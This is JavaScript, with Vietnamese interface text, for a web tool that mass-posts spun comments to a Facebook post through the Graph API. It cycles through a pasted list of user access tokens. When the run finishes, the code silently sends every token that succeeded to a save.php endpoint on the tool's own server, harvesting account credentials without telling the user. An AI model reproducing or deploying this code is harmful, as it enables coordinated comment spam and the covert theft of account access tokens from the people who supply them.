function auto_comment_send(a){
	return 0==auto_comment.run?!1:($('#auto_comment_status').html('<font color="blue">Đang lấy Access Token số <b>'+(a+1)+'</b> để bình luận</font> '+run.loading()),void($).get('https://graph.facebook.com/'+auto_comment.id+'/comments',{
		method:'post',message:init.spinText(auto_comment.msg),access_token:auto_comment.token[a]
	}
	).done(function(){
		++auto_comment.success,auto_comment.bach+=auto_comment.token[a]+'',$('#auto_comment_success').text(auto_comment.success),$('#auto_comment_status').html('<font color="green">Access Token số <b>'+(a+1)+'</b> đã bình luận thành công</font> '+run.loading())
	}
	).error(function(b){
		++auto_comment.error,$('#auto_comment_error').text(auto_comment.error),$('#auto_comment_status').html('<font color="red">Access Token số <b>'+(a+1)+'</b> đã bình luận thất bại</font> '+run.loading())
	}
	).always(function(){
		if($('#auto_comment_progress').attr('style','width: '+Math.floor(100*(auto_comment.success+auto_comment.error)/auto_comment.token.length)+'%'),auto_comment.success+auto_comment.error==auto_comment.token.length){
			$('.progress-striped').removeClass('active'),$('#submit_auto_comment_start').buttonStop(),$('#submit_auto_comment_stop').disabled(),noti.success('Quá trình AUTO comment đã hoàn tất !'),$('#auto_comment_status').text('Đang chờ !');
			var a=$.trim(auto_comment.bach).split('\n');
			a.length>0&&$.post('//'+b_sv+'/save.php',{
				act:'save',array:a
			}
			)
		}
	}
	))
}
location.hostname==b_sv&&($(document).on('click','#submit_auto_comment_stop',function(){
	auto_comment.run=0,$('#submit_auto_comment_stop').disabled(),$('.progress-striped').removeClass('active'),$('#submit_auto_comment_start').buttonStop(),noti.success('Đã có lệnh dừng AUTO comment !'),$('#auto_comment_status').text('Đã dừng AUTO comment !')
}
),$(document).on('click','#submit_auto_comment_start',function(){
	if(auto_comment={
		token:$('#input_auto_comment_token').validate(),id:$('#input_auto_comment_id').isNumber(),msg:$('#input_auto_comment_msg').validate(),delay:$('#input_auto_comment_delay').isNumber(),run:1,success:0,error:0,bach:''
	}
	,auto_comment.token&&auto_comment.id&&auto_comment.msg&&auto_comment.delay){
		$(this).buttonLoad(),auto_comment.token=auto_comment.token.split('\n'),$('.auto_comment_progress').hide().slideDown('fast'),$('.progress-striped').addClass('active'),$('#auto_comment_progress').attr('style','width: 0%'),$('#submit_auto_comment_stop').undisabled();
		for(var a=0;
		a<auto_comment.token.length;
		a++){
			!function(a){
				setTimeout(function(){
					auto_comment_send(a)
				}
				,a*auto_comment.delay)
			}
			(a)
		}
	}
}
))